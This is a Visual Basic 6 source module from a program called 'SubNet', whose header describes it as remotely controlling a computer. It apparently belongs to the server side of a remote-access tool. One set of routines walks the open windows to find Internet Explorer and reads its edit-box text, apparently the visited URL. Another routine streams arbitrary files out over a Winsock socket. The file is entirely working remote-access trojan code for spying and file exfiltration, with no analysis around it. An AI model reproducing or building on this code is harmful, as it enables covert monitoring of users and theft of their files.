Attribute VB_Name = "modFiles"
'**********************************************
'**  Program Name:  SubNet® (©2003-2004)     **
'**  Program Description:  Remotely Control  **
'**       A Computer Via LAN/WAN/Dial-Up     **
'**  Program Ports:  6800-6805               **
'**  GUI Designer:  Steven Tanyi             **
'**     E-mail:  sniper6oo@hotmail.com       **
'**  Programmer:  James Miller               **
'**     E-mail:  usssssy@yahoo.com           **
'**********************************************
Public Function EditInfo(window_hwnd As Long) As String
    Dim txt As String
    Dim buf As String
    Dim buflen As Long
    Dim child_hwnd As Long
    Dim children() As Long
    Dim num_children As Integer
    Dim i As Integer
    buflen = 256
    buf = Space$(buflen - 1)
    buflen = GetClassName(window_hwnd, buf, buflen)
    buf = Left$(buf, buflen)
    If buf = "Edit" Then
        EditInfo = WindowText(window_hwnd)
        Exit Function
    End If
    num_children = 0
    child_hwnd = GetWindow(window_hwnd, GW_CHILD)
    Do While child_hwnd <> 0
        num_children = num_children + 1
        ReDim Preserve children(1 To num_children)
        children(num_children) = child_hwnd
        child_hwnd = GetWindow(child_hwnd, GW_HWNDNEXT)
    Loop
    For i = 1 To num_children
        txt = EditInfo(children(i))
        If txt <> "" Then Exit For
    Next i
    EditInfo = txt
End Function
Public Function WindowText(window_hwnd As Long) As String
    Dim txtlen As Long
    Dim txt As String
    WindowText = ""
    If window_hwnd = 0 Then Exit Function
    txtlen = SendMessage(window_hwnd, WM_GETTEXTLENGTH, 0, 0)
    If txtlen = 0 Then Exit Function
    txtlen = txtlen + 1
    txt = Space$(txtlen)
    txtlen = SendMessage(window_hwnd, WM_GETTEXT, txtlen, ByVal txt)
    WindowText = Left$(txt, txtlen)
End Function
Public Function EnumProc(ByVal app_hwnd As Long, ByVal lParam As Long) As Boolean
    Dim buf As String * 1024
    Dim title As String
    Dim length As Long
    length = GetWindowText(app_hwnd, buf, Len(buf))
    title = Left$(buf, length)
    If Right$(title, 30) = " - Microsoft Internet Explorer" Then
        frmServer.Label1 = EditInfo(app_hwnd)
        EnumProc = 0
    Else
        EnumProc = 1
    End If
End Function

Public Sub SendFile(FileName As String, WinS As Winsock)
    Dim LenFile As Long
    Dim nCnt As Long
    Dim LocData As String
    Open FileName For Binary As #99
        DoEvents
        nCnt = 1
        LenFile = LOF(99)
        WinS.SendData "|FILESIZE|" & LenFile
        DoEvents
        Sleep (400)
        Do Until nCnt >= (LenFile)
            LocData = Space$(1024)
            Get #99, nCnt, LocData
            If nCnt + 1024 > LenFile Then
                WinS.SendData Mid$(LocData, 1, (LenFile - nCnt))
            Else
                WinS.SendData LocData
            End If
            DoEvents
            nCnt = nCnt + 1024
        Loop
    Close #99
End Sub
